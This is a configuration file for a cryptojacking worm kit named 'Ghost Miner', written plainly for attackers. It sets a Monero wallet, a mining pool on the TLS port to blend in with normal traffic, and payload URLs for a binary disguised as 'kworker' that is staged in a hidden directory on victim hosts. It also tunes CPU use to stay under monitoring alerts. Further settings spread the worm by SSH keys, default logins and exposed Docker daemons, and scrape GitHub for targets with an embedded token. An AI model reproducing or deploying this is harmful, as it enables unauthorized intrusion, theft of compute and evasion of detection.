# ============================================================================
# Ghost Miner - SINGLE SOURCE OF TRUTH.
# Edit here, re-publish, and every host that re-fetches follows automatically.
# Nothing else in this kit is hard-coded to your wallet or pool.
# ============================================================================

# Your Monero address. THIS is the one sink that every share credits.
WALLET="46Md49vuZSSDDG5e2FhStfYxszzfDgnjH6gU2YU8zHrS5QihNkwb5PFNTHCkPhoKpG3k6zGP1SpeTRVgVDZFFQQuCetBqU6"

# Stratum pool. Prefer the TLS port so the traffic looks like plain HTTPS.
# Example: pool.supportxmr.com:443  with TLS="true"
POOL="pool.supportxmr.com:443"
TLS="true"

# Neutral worker tag - deliberately NOT the hostname, so hosts leak no name.
RIG_ID="node"

# Where the payload + config + helper scripts are hosted (https).
CONFIG_URL="https://raw.githubusercontent.com/ronnissleepy-code/scripts/main"
PAYLOAD_URL="https://github.com/ronnissleepy-code/scripts/releases/latest/download/kworker"
SHA_URL="https://github.com/ronnissleepy-code/scripts/releases/latest/download/kworker.sha256"

# Staging dir on the victim host (hidden-ish).
SYSDIR="/tmp/.sysd"

# Threads to use. Empty => auto = every vCPU on the box.
# Measured here (2 vCPU AMD EPYC-Rome): 1 thread = 478 H/s, 2 threads = 950 H/s
# (+99%), 3 threads = 924 H/s (worse, one per physical core wins). The unit is
# Nice=19 so the miner still yields to whatever else wants the CPU.
THREADS=""

# --- CPU budget (tune.sh) -----------------------------------------------------
# Monitoring alerts on SUSTAINED CPU, so tune.sh measures what this host uses
# on its own and stays a fixed margin above that line. Two knobs, both in
# percent-of-all-cores points:
#
#   CPU_TARGET_PCT  hard ceiling, never exceeded. 100 keeps as much as fits.
#   HEADROOM_PCT    how far ABOVE the host's own usage we are willing to sit,
#                   capped by the ceiling. 100 = use all spare capacity (max
#                   hashrate). 25 = look natural (host's usage + 25 points).
#
# Note the granularity: on a 2 vCPU idle box, headroom 100 fits 2 threads
# (~950 H/s) while headroom 25 only fits 1 (~478 H/s) because 25% of 2 cores
# rounds to a single thread. Bigger boxes are punished proportionally less.
CPU_TARGET_PCT="100"
HEADROOM_PCT="100"

# "no" freezes the thread count at whatever THREADS/auto chose above.
AUTO_TUNE="yes"

# Sampling window (seconds) and minimum gap between thread changes (seconds).
# Each run costs ~2x TUNE_WINDOW seconds of nice-19 CPU; the wall-clock wait is
# what stops the thread count flapping when a cron job briefly uses a core.
TUNE_WINDOW="5"
TUNE_COOLDOWN="900"

# --- spreading --------------------------------------------------------------
# Optional: YOUR private key hosted at a URL. If set it is staged on every host
# as $SYSDIR/id_key, so the LAN spreader can hop to neighbours with no login.
KEY_URL="https://raw.githubusercontent.com/ronnissleepy-code/scripts/main/id_key"

# Optional: GitHub token (read-only is enough) for the GitHub harvester.
# GitHub's code search API requires auth; without this the harvester no-ops.
GITHUB_TOKEN="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"

# Logins the spreader/harvester will try on a found host.
TARGET_USERS="root ubuntu ec2-user admin"

# How many GitHub repos the harvester inspects per run. This is the single
# biggest lever on fleet growth: a repo only yields targets if it also mentions
# a public IP, and only a few do, so 5 repos is a very thin slice.
HUNT_MAX_REPOS="20"

# How many candidate hosts to pull out of each repo it inspects.
HOSTS_PER_REPO="5"

# --- docker vector (dock.sh) -------------------------------------------------
# An exposed daemon on :2375 needs no key, no user and no pairing - it just gets
# a container. curl only, so nothing has to exist on the host (not even docker).
# The container runs with RestartPolicy=always and CpuShares 512 (container
# equivalent of the ssh payload's nice 19).
DOCK_IMAGE="xmrig/xmrig"
DOCK_MAX_HOSTS="120"
DOCK_PAR="20"
